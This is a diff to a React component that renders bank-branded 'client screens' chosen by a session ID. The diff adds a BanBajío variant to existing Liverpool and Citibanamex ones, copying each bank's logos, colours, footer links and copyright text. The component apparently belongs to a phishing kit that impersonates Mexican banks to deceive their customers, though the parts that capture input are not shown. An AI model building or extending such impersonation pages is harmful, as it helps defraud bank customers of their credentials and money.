@@ -6,6 +6,7 @@ import { Session, ScreenType } from '@shared/schema';
 import { formatDate } from '@/utils/helpers';
 import liverpoolLogo from '../assets/pngwing.com 2.png';
 import citibanamexLogo from '../assets/Banamex.png';
+import banbajioLogo from '../assets/banbajio_logo.png';
 
 export default function ClientScreen() {
   // Get session ID from URL
@@ -96,18 +97,102 @@ export default function ClientScreen() {
     }
   };
 
-  return (
-    <div className="min-h-screen flex flex-col bg-white">
-      <header className={`${sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 'bg-[#e10098]'} text-white p-4 text-center`}>
-        <img 
-          src={sessionData.banco === 'CITIBANAMEX' ? citibanamexLogo : liverpoolLogo} 
-          className="h-20 inline-block" 
-          alt={sessionData.banco === 'CITIBANAMEX' ? 'Citibanamex' : 'Liverpool'} 
-        />
-        <div className="font-bold text-sm mt-2">{formatDate(new Date())}</div>
-      </header>
+  // Función para determinar el header basado en el banco
+  const renderHeader = () => {
+    if (sessionData.banco === 'BANBAJIO') {
+      return (
+        <>
+          <div className="logo text-center py-4">
+            <img 
+              src="https://upload.wikimedia.org/wikipedia/commons/f/f3/BanBajio_logo.svg" 
+              alt="BanBajío"
+              className="h-16 inline-block"
+            />
+          </div>
+          <div className="banbajio-header">7 de abril de 2025</div>
+        </>
+      );
+    } else if (sessionData.banco === 'CITIBANAMEX') {
+      return (
+        <header className="bg-[#005BAC] text-white p-4 text-center">
+          <img 
+            src={citibanamexLogo} 
+            className="h-20 inline-block" 
+            alt="Citibanamex" 
+          />
+          <div className="font-bold text-sm mt-2">{formatDate(new Date())}</div>
+        </header>
+      );
+    } else {
+      return (
+        <header className="bg-[#e10098] text-white p-4 text-center">
+          <img 
+            src={liverpoolLogo} 
+            className="h-20 inline-block" 
+            alt="Liverpool" 
+          />
+          <div className="font-bold text-sm mt-2">{formatDate(new Date())}</div>
+        </header>
+      );
+    }
+  };
 
-      {sessionData.banco !== 'CITIBANAMEX' && (
+  // Función para renderizar el footer específico de BanBajío
+  const renderFooter = () => {
+    if (sessionData.banco === 'BANBAJIO') {
+      return (
+        <footer className="mt-auto">
+          <div className="banbajio-footer">
+            Aprende más | Ayuda | Términos y condiciones | Seguridad en línea
+          </div>
+          <div className="banbajio-footer-bottom">
+            <a href="#" className="text-white mx-2">Contáctanos</a>
+            <a href="#" className="text-white mx-2">Aclaraciones</a>
+            <a href="#" className="text-white mx-2">Promociones</a>
+            <a href="#" className="text-white mx-2">Facebook</a>
+            <a href="#" className="text-white mx-2">YouTube</a>
+            <br />
+            © Banbajio México 2024. Todos los Derechos Reservados
+          </div>
+        </footer>
+      );
+    } else {
+      return (
+        <footer className="mt-auto">
+          <div className="bg-gray-100 p-4 text-center text-sm">
+            <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Aprende más</a>
+            <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Ayuda</a>
+            <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Términos y condiciones</a>
+            <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Seguridad en línea</a>
+          </div>
+
+          <div className={`${sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 'bg-[#e10098]'} text-white p-4 text-center text-sm`}>
+            <div className="mb-3">
+              <a href="#" className="text-white mx-2">Contáctanos</a> |
+              <a href="#" className="text-white mx-2">Aclaraciones</a> |
+              <a href="#" className="text-white mx-2">Promociones</a> |
+              <a href="#" className="text-white mx-2">Facebook</a> |
+              <a href="#" className="text-white mx-2">Youtube</a>
+            </div>
+            <div>© {sessionData.banco === 'CITIBANAMEX' ? 'Banamex' : 'Liverpool'} México 2024. Todos los Derechos Reservados</div>
+          </div>
+        </footer>
+      );
+    }
+  };
+
+  // Función para mostrar información adicional según el banco
+  const renderBankInfo = () => {
+    if (sessionData.banco === 'BANBAJIO') {
+      return null; // BanBajío no muestra información adicional
+    } else if (sessionData.banco === 'CITIBANAMEX') {
+      return (
+        <div className="text-center mt-4 px-4">
+          <p className="text-sm text-gray-600">Banca digital segura para todos tus trámites financieros</p>
+        </div>
+      );
+    } else {
+      return (
         <div className="text-center mt-4 px-4">
           <p className="text-sm">Recuerda que con una sola cuenta puedes ingresar a todas nuestras tiendas.</p>
           <div className="mt-2 space-x-2">
@@ -123,13 +208,14 @@ export default function ClientScreen() {
             />
           </div>
         </div>
-      )}
-      
-      {sessionData.banco === 'CITIBANAMEX' && (
-        <div className="text-center mt-4 px-4">
-          <p className="text-sm text-gray-600">Banca digital segura para todos tus trámites financieros</p>
-        </div>
-      )}
+      );
+    }
+  };
+
+  return (
+    <div className={`min-h-screen flex flex-col ${sessionData.banco === 'BANBAJIO' ? 'bg-[url("https://i.ibb.co/8x40ZZM/banbajio-fondo.jpg")] bg-cover' : 'bg-white'}`}>
+      {renderHeader()}
+      {renderBankInfo()}
 
       <div className="container mx-auto max-w-md px-6 py-8 flex-grow">
         <ScreenTemplates 
@@ -140,25 +226,7 @@ export default function ClientScreen() {
         />
       </div>
 
-      <footer className="mt-auto">
-        <div className="bg-gray-100 p-4 text-center text-sm">
-          <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Aprende más</a>
-          <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Ayuda</a>
-          <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Términos y condiciones</a>
-          <a href="#" className={`${sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 'text-[#e10098]'} mx-2`}>Seguridad en línea</a>
-        </div>
-
-        <div className={`${sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 'bg-[#e10098]'} text-white p-4 text-center text-sm`}>
-          <div className="mb-3">
-            <a href="#" className="text-white mx-2">Contáctanos</a> |
-            <a href="#" className="text-white mx-2">Aclaraciones</a> |
-            <a href="#" className="text-white mx-2">Promociones</a> |
-            <a href="#" className="text-white mx-2">Facebook</a> |
-            <a href="#" className="text-white mx-2">Youtube</a>
-          </div>
-          <div>© {sessionData.banco === 'CITIBANAMEX' ? 'Banamex' : 'Liverpool'} México 2024. Todos los Derechos Reservados</div>
-        </div>
-      </footer>
+      {renderFooter()}
     </div>
   );
 }
